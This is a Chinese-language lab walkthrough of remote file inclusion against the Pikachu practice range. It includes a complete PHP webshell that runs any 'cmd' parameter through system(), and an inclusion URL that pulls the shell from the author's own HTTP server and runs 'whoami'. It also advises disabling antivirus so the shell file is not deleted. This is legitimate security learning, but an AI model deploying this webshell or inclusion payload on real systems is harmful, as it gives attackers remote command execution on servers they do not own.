# 概要
remote和local的区别，我认为主要在能够访问到的文件范围。  
  local能访问到服务器自己内部存储的文件  
  而remote能访问到服务器的网络所能访问的文件，范围更大（很多服务器有自己的内网的话就不一定能访问外界的一些网络）  

## 注意
对于pikachu靶场的这个file_inclusion_romote,需要在 php.ini 这个文件里把 allow_url_include 设置为 On ，要不然这个romote是无法读取外部的链接的

# 步骤
## 1.
页面没有什么变化是一样的，依旧是下拉框，我们依旧bp绕过前端限制
<img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/9b89dc39-419b-488f-992f-deca3682dd61" />
## 2.
既然是romote了，所以我们要先搭建一个让靶场能访问到的http服务，选择好根目录，进入cmd，然后用python搭建临时的http服务，映射到本机的 8000 端口
如图<img width="2287" height="1594" alt="image" src="https://github.com/user-attachments/assets/6825909f-7efb-49b6-b628-4a2f43736820" />

## 3.
然后准备恶意文件shell.php
``` php
<?php
header('Content-Type: text/html; charset=utf-8');

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "Command: " . htmlspecialchars($cmd) . "<br><br>";
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Command: " . htmlspecialchars($cmd) . "<br><br>";
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "RFI Webshell is online!<br>";
    echo "Usage: POST or GET parameter 'cmd' to execute command.";
}
?>
```
### 注意
提前关闭电脑安全中心或者设置免杀，要不然，在你这个文件保存的瞬间就会被杀毒软件识别并被删除  
因为这个就是一个靶场的，所以没有什么很高级的免杀设置，会被瞬间检测到

## 4.
然后在靶场访问这个我们搭建好的文件
filename=   http://192.168.43.143:8000/shell.php&cmd=whoami&submit=提交
注意着这个ip地址要用电脑自己的，不要用127.0.0.1，因为用的是容器，会在容器内部回环，我当时一直读不到文件，终端服务那边也没显示，后来改了主机ip后才能正常访问的，cmd=  后面可以改其他命令
<img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/d069df8c-98b8-403f-a2dd-f5fc666514c8" />

这个恶意文件，我不太会写，找ai要了然后改的。现在先会用，日后慢慢研究，等我把所有基础漏洞都学完后，就开始更深入的去了解了，现在先用着




